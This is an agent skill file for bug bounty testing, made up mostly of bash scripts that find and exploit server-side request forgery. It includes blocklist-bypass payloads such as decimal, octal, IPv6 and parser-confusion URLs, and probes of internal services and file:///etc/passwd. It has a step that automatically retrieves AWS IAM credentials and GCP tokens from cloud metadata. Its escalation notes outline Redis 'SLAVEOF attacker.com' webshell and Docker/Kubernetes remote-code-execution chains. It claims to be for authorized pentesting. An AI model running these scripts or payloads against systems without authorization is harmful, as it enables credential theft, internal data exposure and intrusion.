---
name: web-vuln-ssrf
description: SSRF vulnerability detection with IP bypass techniques and cloud metadata exploitation
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Detects Server-Side Request Forgery (SSRF) vulnerabilities by identifying URL-accepting parameters, confirming blind SSRF via out-of-band (OOB) callbacks, escalating to internal service access, and exploiting cloud instance metadata endpoints (AWS, GCP, Azure). Includes all 11 IP bypass techniques to evade server-side blocklists and filter bypasses, plus chain escalation paths from DNS-only SSRF to cloud credential extraction and RCE.

## When to use

- When a request parameter accepts a URL, hostname, IP address, or domain
- When a feature fetches remote content (webhook URLs, avatar URLs, PDF generators, link previews, import by URL)
- When an SVG upload endpoint renders the file server-side
- When a redirect parameter passes user-controlled URLs to a backend fetch
- When an API accepts a `callback`, `webhook`, `src`, `image`, `next`, or `redirect` parameter

## Prerequisites

- An out-of-band callback listener (interactsh recommended: `interactsh-client`)
- `curl` installed
- A valid bug bounty or pentest authorization for the target
- For cloud metadata testing: the target must be hosted on AWS, GCP, or Azure (check response headers or DNS for cloud provider signals)

## Inputs

| Variable | Required | Description |
|----------|----------|-------------|
| `SECSKILL_TARGET` | Yes | Base URL of the target (e.g., `https://app.example.com`) |
| `SECSKILL_SSRF_PARAM` | Yes | Parameter name that accepts a URL (e.g., `url`, `webhook`, `src`) |
| `SECSKILL_SSRF_ENDPOINT` | Yes | Full endpoint path containing the parameter (e.g., `/api/fetch`) |
| `SECSKILL_OOB_HOST` | Yes | Your interactsh or Burp Collaborator host for OOB detection |
| `SECSKILL_METHOD` | Optional | HTTP method for the endpoint (default: `GET`) |
| `SECSKILL_TOKEN` | Optional | Bearer token or session cookie for authenticated endpoints |
| `SECSKILL_OUTPUT_DIR` | Optional | Directory to save results (default: `./output`) |

## Workflow

### Step 1: Environment setup and injection point identification

```bash
export TARGET="${SECSKILL_TARGET}"
export PARAM="${SECSKILL_SSRF_PARAM}"
export ENDPOINT="${SECSKILL_SSRF_ENDPOINT}"
export OOB="${SECSKILL_OOB_HOST}"
export METHOD="${SECSKILL_METHOD:-GET}"
export TOKEN="${SECSKILL_TOKEN:-}"
export OUTDIR="${SECSKILL_OUTPUT_DIR:-./output}"
mkdir -p "$OUTDIR"

AUTH_HEADER=""
[ -n "$TOKEN" ] && AUTH_HEADER="-H \"Authorization: Bearer $TOKEN\""

echo "[*] Target    : $TARGET"
echo "[*] Endpoint  : $ENDPOINT"
echo "[*] Parameter : $PARAM"
echo "[*] OOB host  : $OOB"

# Scan for additional URL-accepting parameters in JS and HTML source
echo "[*] Scanning for additional SSRF injection points..."
curl -sk "$TARGET" | grep -oE '(url|src|href|action|webhook|callback|redirect|next|dest|image|avatar|feed|import)[="\047][^"\047 >]{5,}' \
  | sort -u | head -20

# Also check JSON body parameters in API calls
curl -sk "$TARGET/api" -X OPTIONS 2>/dev/null | head -5
echo "[*] Manual check: look for webhook/URL fields in Burp Proxy HTTP history"
```

### Step 2: Confirm SSRF via OOB callback

```bash
echo "=== Step 2: OOB SSRF Detection ==="

# Start interactsh listener in background (if available)
if command -v interactsh-client &>/dev/null; then
  echo "[*] Starting interactsh listener..."
  interactsh-client -server interactsh.com -token "" \
    -o "$OUTDIR/oob_hits.txt" &
  INTERACTSH_PID=$!
  sleep 2
  echo "[+] Listener PID: $INTERACTSH_PID"
fi

# Send SSRF probe with OOB host
echo "[*] Sending OOB probe..."
if [ "$METHOD" = "POST" ]; then
  curl -sk -X POST "$TARGET$ENDPOINT" \
    -H "Content-Type: application/json" \
    $AUTH_HEADER \
    -d "{\"${PARAM}\": \"http://${OOB}/ssrf-test\"}" \
    -o "$OUTDIR/oob_response.txt" -w "HTTP: %{http_code}\n"
else
  curl -sk "$TARGET$ENDPOINT?${PARAM}=http://${OOB}/ssrf-test" \
    $AUTH_HEADER \
    -o "$OUTDIR/oob_response.txt" -w "HTTP: %{http_code}\n"
fi

echo "[*] Check $OUTDIR/oob_hits.txt or your Burp Collaborator for DNS/HTTP callbacks"
echo "[*] Wait 10–15 seconds for DNS propagation before concluding no callback"
sleep 3

# Check response body for SSRF signals (error-based detection)
echo "[*] Response body (error-based SSRF signals):"
grep -iE "connection refused|timeout|resolve|dns|network|socket|errno|ECONNREFUSED|invalid url" \
  "$OUTDIR/oob_response.txt" 2>/dev/null | head -5
```

### Step 3: Test internal targets

```bash
echo "=== Step 3: Internal Target Access ==="

# Common internal services to probe
declare -A INTERNAL_TARGETS=(
  ["localhost_80"]="http://localhost/"
  ["localhost_8080"]="http://localhost:8080/"
  ["localhost_8443"]="http://localhost:8443/"
  ["redis"]="http://localhost:6379/"
  ["elasticsearch"]="http://localhost:9200/"
  ["docker_api"]="http://localhost:2375/version"
  ["kubernetes"]="http://localhost:10250/metrics"
  ["memcached"]="http://localhost:11211/"
  ["mongodb"]="http://localhost:27017/"
  ["internal_172"]="http://172.16.0.1/"
  ["internal_10"]="http://10.0.0.1/"
)

for name in "${!INTERNAL_TARGETS[@]}"; do
  url="${INTERNAL_TARGETS[$name]}"
  if [ "$METHOD" = "POST" ]; then
    code=$(curl -sk -X POST "$TARGET$ENDPOINT" \
      -H "Content-Type: application/json" \
      $AUTH_HEADER \
      -d "{\"${PARAM}\": \"${url}\"}" \
      -o "$OUTDIR/internal_${name}.json" -w "%{http_code}")
  else
    code=$(curl -sk "$TARGET$ENDPOINT?${PARAM}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${url}'))")" \
      $AUTH_HEADER \
      -o "$OUTDIR/internal_${name}.json" -w "%{http_code}")
  fi

  size=$(wc -c < "$OUTDIR/internal_${name}.json" 2>/dev/null || echo 0)
  echo "  [$code|${size}B] $name -> $url"
  # Non-empty 200 responses indicate internal access
  [ "$code" = "200" ] && [ "$size" -gt 10 ] && \
    echo "  [!] POTENTIAL SSRF — internal service reachable: $name"
done
```

### Step 4: IP bypass techniques (blocklist evasion)

```bash
echo "=== Step 4: IP Bypass Techniques ==="
# Apply when direct 127.0.0.1 or 169.254.169.254 is blocked

# Target to bypass (use metadata IP or localhost)
BLOCKED_IP="127.0.0.1"

# All 11 bypass techniques
declare -A BYPASSES=(
  ["decimal"]="http://2130706433/"               # 127.0.0.1 as decimal
  ["octal"]="http://0177.0.0.1/"                  # octal 0177 = 127
  ["hex"]="http://0x7f.0x0.0x0.0x1/"             # hex representation
  ["short_ip"]="http://127.1/"                    # abbreviated notation
  ["ipv6_loopback"]="http://[::1]/"               # IPv6 loopback
  ["ipv6_mapped"]="http://[::ffff:127.0.0.1]/"   # IPv4-mapped IPv6
  ["ipv6_hex"]="http://[::ffff:0x7f000001]/"      # mixed hex IPv6
  ["url_encoded"]="http://%31%32%37%2e%30%2e%30%2e%31/"  # URL-encoded
  ["double_encoded"]="http://%2531%2532%2537%2e%30%2e%30%2e%31/"
  ["at_symbol"]="http://attacker.com@127.0.0.1/" # parser confusion
  ["bracket"]="http://127.0.0.1:80#@evil.com/"   # fragment abuse
)

for technique in "${!BYPASSES[@]}"; do
  bypass_url="${BYPASSES[$technique]}"
  if [ "$METHOD" = "POST" ]; then
    code=$(curl -sk -X POST "$TARGET$ENDPOINT" \
      -H "Content-Type: application/json" \
      $AUTH_HEADER \
      -d "{\"${PARAM}\": \"${bypass_url}\"}" \
      -o "$OUTDIR/bypass_${technique}.txt" -w "%{http_code}")
  else
    code=$(curl -sk "$TARGET$ENDPOINT?${PARAM}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${bypass_url}'))")" \
      $AUTH_HEADER \
      -o "$OUTDIR/bypass_${technique}.txt" -w "%{http_code}")
  fi
  size=$(wc -c < "$OUTDIR/bypass_${technique}.txt" 2>/dev/null || echo 0)
  echo "  [$code|${size}B] $technique: $bypass_url"
  [ "$code" = "200" ] && [ "$size" -gt 20 ] && \
    echo "  [!] BYPASS SUCCESS via $technique technique"
done

# Redirect chain bypass (external URL redirects to internal)
echo ""
echo "[*] Redirect chain bypass: if external URLs are allowed, use a redirect"
echo "    Host a redirect at your server: curl http://your-server/r -> 302 -> http://169.254.169.254/"
echo "    Then: ${PARAM}=http://your-server/r"
```

### Step 5: Cloud metadata exploitation

```bash
echo "=== Step 5: Cloud Metadata Exploitation ==="

# Detect cloud provider from response headers or DNS
echo "[*] Detecting cloud provider..."
curl -sk -I "$TARGET" 2>/dev/null | grep -iE "x-amz|x-goog|x-ms-|server: EC2|cloudfront|amazonaws" | head -5

# AWS IMDSv1 (no token required — most critical)
AWS_META_IP="169.254.169.254"
echo ""
echo "[*] Testing AWS IMDSv1 metadata..."
for aws_path in \
  "/latest/meta-data/" \
  "/latest/meta-data/iam/security-credentials/" \
  "/latest/meta-data/public-hostname" \
  "/latest/meta-data/local-ipv4" \
  "/latest/user-data"; do
  if [ "$METHOD" = "POST" ]; then
    code=$(curl -sk -X POST "$TARGET$ENDPOINT" \
      -H "Content-Type: application/json" \
      $AUTH_HEADER \
      -d "{\"${PARAM}\": \"http://${AWS_META_IP}${aws_path}\"}" \
      -o "$OUTDIR/aws_meta.txt" -w "%{http_code}")
  else
    code=$(curl -sk "$TARGET$ENDPOINT?${PARAM}=http://${AWS_META_IP}${aws_path}" \
      $AUTH_HEADER \
      -o "$OUTDIR/aws_meta.txt" -w "%{http_code}")
  fi
  size=$(wc -c < "$OUTDIR/aws_meta.txt" 2>/dev/null || echo 0)
  echo "  [$code|${size}B] AWS: $aws_path"
  [ "$code" = "200" ] && [ "$size" -gt 5 ] && {
    echo "  [!] AWS METADATA ACCESSIBLE"
    cat "$OUTDIR/aws_meta.txt"
    # If we got a role name, fetch the credentials
    if cat "$OUTDIR/aws_meta.txt" | grep -qE '^[A-Za-z]'; then
      ROLE=$(cat "$OUTDIR/aws_meta.txt" | head -1 | tr -d '[:space:]')
      echo "  [!] IAM Role found: $ROLE — fetching credentials..."
      curl -sk "$TARGET$ENDPOINT?${PARAM}=http://${AWS_META_IP}/latest/meta-data/iam/security-credentials/${ROLE}" \
        $AUTH_HEADER -o "$OUTDIR/aws_creds.json"
      cat "$OUTDIR/aws_creds.json"
    fi
  }
done

# GCP metadata
echo ""
echo "[*] Testing GCP metadata..."
for gcp_path in \
  "http://metadata.google.internal/computeMetadata/v1/instance/" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"; do
  if [ "$METHOD" = "POST" ]; then
    code=$(curl -sk -X POST "$TARGET$ENDPOINT" \
      -H "Content-Type: application/json" \
      $AUTH_HEADER \
      -d "{\"${PARAM}\": \"${gcp_path}\", \"headers\": {\"Metadata-Flavor\": \"Google\"}}" \
      -o "$OUTDIR/gcp_meta.txt" -w "%{http_code}")
  else
    code=$(curl -sk "$TARGET$ENDPOINT?${PARAM}=${gcp_path}" \
      -H "Metadata-Flavor: Google" \
      $AUTH_HEADER \
      -o "$OUTDIR/gcp_meta.txt" -w "%{http_code}")
  fi
  size=$(wc -c < "$OUTDIR/gcp_meta.txt" 2>/dev/null || echo 0)
  echo "  [$code|${size}B] GCP: $gcp_path"
  [ "$code" = "200" ] && [ "$size" -gt 5 ] && echo "  [!] GCP METADATA ACCESSIBLE" && \
    cat "$OUTDIR/gcp_meta.txt"
done

# Azure metadata (requires Metadata: true header)
echo ""
echo "[*] Testing Azure IMDS..."
AZURE_META="http://169.254.169.254/metadata/instance?api-version=2021-02-01"
code=$(curl -sk "$TARGET$ENDPOINT?${PARAM}=${AZURE_META}" \
  -H "Metadata: true" \
  $AUTH_HEADER \
  -o "$OUTDIR/azure_meta.txt" -w "%{http_code}")
echo "  [$code] Azure IMDS"
[ "$code" = "200" ] && echo "  [!] AZURE METADATA ACCESSIBLE" && \
  python3 -m json.tool "$OUTDIR/azure_meta.txt" 2>/dev/null | head -20
```

### Step 6: Alternative protocols and chain assessment

```bash
echo "=== Step 6: Alternative Protocols ==="

# Test non-HTTP protocols (if the fetcher uses curl/wget internally)
for proto_url in \
  "file:///etc/passwd" \
  "file:///etc/hosts" \
  "dict://localhost:6379/info" \
  "gopher://localhost:6379/_INFO%0d%0a" \
  "ftp://localhost/"; do
  if [ "$METHOD" = "POST" ]; then
    code=$(curl -sk -X POST "$TARGET$ENDPOINT" \
      -H "Content-Type: application/json" \
      $AUTH_HEADER \
      -d "{\"${PARAM}\": \"${proto_url}\"}" \
      -o "$OUTDIR/proto_test.txt" -w "%{http_code}")
  else
    code=$(curl -sk "$TARGET$ENDPOINT?${PARAM}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${proto_url}'))")" \
      $AUTH_HEADER \
      -o "$OUTDIR/proto_test.txt" -w "%{http_code}")
  fi
  size=$(wc -c < "$OUTDIR/proto_test.txt" 2>/dev/null || echo 0)
  echo "  [$code|${size}B] $proto_url"
  [ "$size" -gt 20 ] && grep -E "root:|localhost|127" "$OUTDIR/proto_test.txt" && \
    echo "  [!] FILE READ via SSRF"
done

echo ""
echo "=== Chain Impact Assessment ==="
cat <<'EOF'
SSRF Impact Classification:
  DNS callback only                        -> Informational (DO NOT report alone)
  HTTP request to OOB host                 -> Low
  Internal service reachable (e.g. Redis)  -> Medium
  Admin panel or sensitive internal API    -> High
  Cloud metadata accessible                -> High
  Cloud IAM credentials extracted          -> Critical
  RCE via internal service (Docker/Redis)  -> Critical

Chain escalation paths:
  SSRF + AWS IMDSv1 -> extract AccessKeyId/SecretAccessKey -> AWS API RCE
  SSRF + internal port 2375 (Docker API) -> POST /containers/create -> RCE
  SSRF + internal Redis -> SLAVEOF attacker.com -> write webshell -> RCE
  SSRF + internal Elasticsearch -> dump all indices -> mass data breach
  SSRF + internal K8s (10250) -> /exec endpoint -> RCE on pods
EOF
```

## Done when

- SSRF is confirmed via OOB DNS/HTTP callback OR visible difference in server response (error messages, timing, content)
- At least one internal target is accessible OR cloud metadata endpoint responds
- Impact is classified beyond "DNS only" (otherwise Informational, not reportable alone)
- Chain potential is assessed (can SSRF reach cloud creds, internal admin, or RCE vector?)
- A reproducible curl command is documented with full request and response for the bug report
- Results are saved in `$OUTDIR/`

## Failure modes

| Symptom | Cause | Resolution |
|---------|-------|------------|
| No OOB callback received | Endpoint does not make outbound requests, or request is async | Wait 30s for async; check if response body changes with different URLs |
| Direct IPs blocked (127.x, 169.254.x) | Server-side IP blocklist | Apply IP bypass techniques in Step 4 (decimal, octal, IPv6, redirect chain) |
| DNS resolves but HTTP fails | Egress firewall blocks HTTP to internal | Try gopher:// or dict:// protocols, or test different ports |
| Cloud metadata returns 403 | IMDSv2 enforced (AWS) | IMDSv2 requires a PUT token step that is hard to chain through SSRF; note as partial finding |
| All protocols blocked | Application uses a strict URL allowlist | Test redirect chain bypass: allowlisted domain -> 302 -> internal target |
| Response is same for all URLs | Backend validates URL but does not fetch | Confirm with timing-based detection: internal timeouts differ from external |
| GCP metadata 403 | Missing `Metadata-Flavor: Google` header | The SSRF must forward this header; test if the app accepts custom forwarded headers |

## Notes

- DNS-only SSRF is Informational and should not be reported alone — always attempt to escalate to HTTP access before reporting.
- AWS IMDSv1 (no token required) is the highest-value cloud target. IMDSv2 requires a PUT preauth step which is typically not chainable through SSRF.
- The redirect chain bypass (allow external URL → 302 → internal IP) bypasses most naive IP blocklists because the check runs on the original URL, not the redirect destination.
- The `gopher://` protocol can send arbitrary TCP bytes to internal services, enabling Redis exploitation, SMTP relay abuse, and Memcached reads.
- Test the `Metadata-Flavor: Google` header injection: if the SSRF fetcher forwards request headers from the attacker, GCP metadata becomes accessible even when the app does not include the header itself.
- When cloud credentials are extracted, stop immediately — do not use them. Document the `AccessKeyId`, `SecretAccessKey`, and `Token` fields in the report as evidence. Using extracted credentials is unauthorized access.
